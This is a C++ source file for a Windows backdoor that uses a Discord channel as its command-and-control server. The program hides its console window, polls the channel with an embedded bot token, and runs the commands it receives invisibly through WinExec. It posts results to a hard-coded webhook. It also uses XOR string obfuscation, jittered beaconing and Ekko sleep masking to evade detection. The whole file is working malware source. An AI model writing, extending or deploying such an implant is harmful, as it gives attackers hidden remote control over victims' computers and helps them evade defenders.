#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <string>
#include <utility>
#include <random>
#include <vector>

#pragma comment(lib, "winhttp.lib")

// Compile-time XOR obfuscation template
template<typename Char, size_t... Is>
constexpr auto encrypt_string(const Char* str, std::index_sequence<Is...>) {
    struct Encrypted {
        Char data[sizeof...(Is)];
        constexpr Encrypted(const Char* s) : data{ (Char)(s[Is] ^ 0x5A)... } {}
        void decrypt() {
            for (size_t i = 0; i < sizeof...(Is); ++i) data[i] ^= 0x5A;
        }
    };
    return Encrypted(str);
}

#define OBFUSCATE(str) encrypt_string(str, std::make_index_sequence<sizeof(str)>())

// External declaration for Ekko Sleep
extern void EkkoSleep(DWORD sleepTimeMs, PVOID pPayloadBase, SIZE_T payloadSize, PBYTE rc4Key);

// Discord API Details
// Webhook for sending responses
// https://discord.com/api/webhooks/1495400658042126749/0dGZSbTh5akJQY0FYb3VKaW5hTVRvVkcySDEydVlhVVhQSkNJbHcteldycTRJYnlsakNTbU5OUV9MM3JoOWViNi1SbCI=
// Bot Token for reading commands
// MTQ5NDQwNTc3OTgwODE5MDUxNC5MTQ5NDQwNTc3OTgwODE5MDUxQw==
// Channel ID for polling
// 1495400658042126749

std::string SendWinHttpRequest(const std::wstring& host, const std::wstring& path, const std::wstring& method, const std::string& data, const std::wstring& additionalHeaders) {
    std::string response;
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return response;

    HINTERNET hConnect = WinHttpConnect(hSession, host.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (hConnect) {
        HINTERNET hRequest = WinHttpOpenRequest(hConnect, method.c_str(), path.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
        if (hRequest) {
            BOOL bResults = WinHttpSendRequest(hRequest, additionalHeaders.empty() ? WINHTTP_NO_ADDITIONAL_HEADERS : additionalHeaders.c_str(), -1, (LPVOID)data.c_str(), data.length(), data.length(), 0);
            if (bResults) {
                bResults = WinHttpReceiveResponse(hRequest, NULL);
                if (bResults) {
                    DWORD dwSize = 0;
                    DWORD dwDownloaded = 0;
                    do {
                        dwSize = 0;
                        if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
                        if (dwSize == 0) break;
                        
                        std::vector<char> buffer(dwSize + 1, 0);
                        if (WinHttpReadData(hRequest, (LPVOID)buffer.data(), dwSize, &dwDownloaded)) {
                            response.append(buffer.data(), dwDownloaded);
                        }
                    } while (dwSize > 0);
                }
            }
            WinHttpCloseHandle(hRequest);
        }
        WinHttpCloseHandle(hConnect);
    }
    WinHttpCloseHandle(hSession);
    return response;
}

bool send_discord_message(const std::string& message) {
    auto host = OBFUSCATE(L"discord.com");
    auto path = OBFUSCATE(L"/api/webhooks/1495400658042126749/0dGZSbTh5akJQY0FYb3VKaW5hTVRvVkcySDEydVlhVVhQSkNJbHcteldycTRJYnlsakNTbU5OUV9MM3JoOWViNi1SbCI=");
    host.decrypt(); path.decrypt();

    std::string jsonPayload = "{\"content\":\"" + message + "\"}";
    std::wstring headers = L"Content-Type: application/json\r\n";

    std::string res = SendWinHttpRequest(host.data, path.data, L"POST", jsonPayload, headers);
    
    SecureZeroMemory((void*)host.data, sizeof(host.data));
    SecureZeroMemory((void*)path.data, sizeof(path.data));
    
    return !res.empty() || GetLastError() == ERROR_SUCCESS;
}

std::string poll_discord_commands(std::string& lastMessageId) {
    auto host = OBFUSCATE(L"discord.com");
    auto path = OBFUSCATE(L"/api/v10/channels/1495400658042126749/messages?limit=1");
    auto token = OBFUSCATE(L"Authorization: Bot MTQ5NDQwNTc3OTgwODE5MDUxNC5MTQ5NDQwNTc3OTgwODE5MDUxQw==\r\n");
    host.decrypt(); path.decrypt(); token.decrypt();

    std::wstring reqPath = path.data;
    if (!lastMessageId.empty()) {
        reqPath += L"&after=" + std::wstring(lastMessageId.begin(), lastMessageId.end());
    }

    std::string res = SendWinHttpRequest(host.data, reqPath, L"GET", "", token.data);
    
    SecureZeroMemory((void*)host.data, sizeof(host.data));
    SecureZeroMemory((void*)path.data, sizeof(path.data));
    SecureZeroMemory((void*)token.data, sizeof(token.data));

    // Extremely basic JSON parsing to extract content and id
    std::string command = "";
    size_t contentPos = res.find("\"content\": \"");
    if (contentPos != std::string::npos) {
        contentPos += 12;
        size_t endPos = res.find("\"", contentPos);
        if (endPos != std::string::npos) {
            command = res.substr(contentPos, endPos - contentPos);
        }
    }
    
    size_t idPos = res.find("\"id\": \"");
    if (idPos != std::string::npos) {
        idPos += 7;
        size_t endPos = res.find("\"", idPos);
        if (endPos != std::string::npos) {
            lastMessageId = res.substr(idPos, endPos - idPos);
        }
    }

    return command;
}

void execute_command(const std::string& cmd) {
    if (cmd.empty()) return;
    
    if (cmd == "ping") {
        send_discord_message("pong");
    } else if (cmd.find("exec ") == 0) {
        std::string sysCmd = cmd.substr(5);
        // Basic execution, output not captured for brevity in this example
        WinExec(sysCmd.c_str(), SW_HIDE);
        send_discord_message("Executed: " + sysCmd);
    } else if (cmd == "exit") {
        send_discord_message("Shutting down.");
        ExitProcess(0);
    }
}

DWORD CalculateJitter(DWORD baseSleepMs, int jitterPercentage) {
    std::random_device rd;
    std::mt19937 gen(rd());
    
    DWORD jitterAmount = (baseSleepMs * jitterPercentage) / 100;
    std::uniform_int_distribution<> dist(-static_cast<int>(jitterAmount), static_cast<int>(jitterAmount));
    
    return baseSleepMs + dist(gen);
}

int main() {
    HWND hWnd = GetConsoleWindow();
    if (hWnd) ShowWindow(hWnd, SW_HIDE);

    send_discord_message("[*] Native Discord C2 Beacon Online.");

    DWORD baseSleep = 5000; // 5 seconds
    int jitter = 20;        // 20% jitter
    std::string lastMsgId = "";
    
    // Dummy key for Ekko (usually generated dynamically)
    BYTE rc4Key[16] = { 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10 };
    
    // Get base address and size of current module for Ekko
    PVOID pPayloadBase = GetModuleHandle(NULL);
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)pPayloadBase;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)pPayloadBase + dosHeader->e_lfanew);
    SIZE_T payloadSize = ntHeaders->OptionalHeader.SizeOfImage;

    while (true) {
        std::string cmd = poll_discord_commands(lastMsgId);
        if (!cmd.empty()) {
            execute_command(cmd);
        }
        
        DWORD currentSleep = CalculateJitter(baseSleep, jitter);
        
        // Execute Ekko Sleep
        EkkoSleep(currentSleep, pPayloadBase, payloadSize, rc4Key);
    }

    return 0;
}
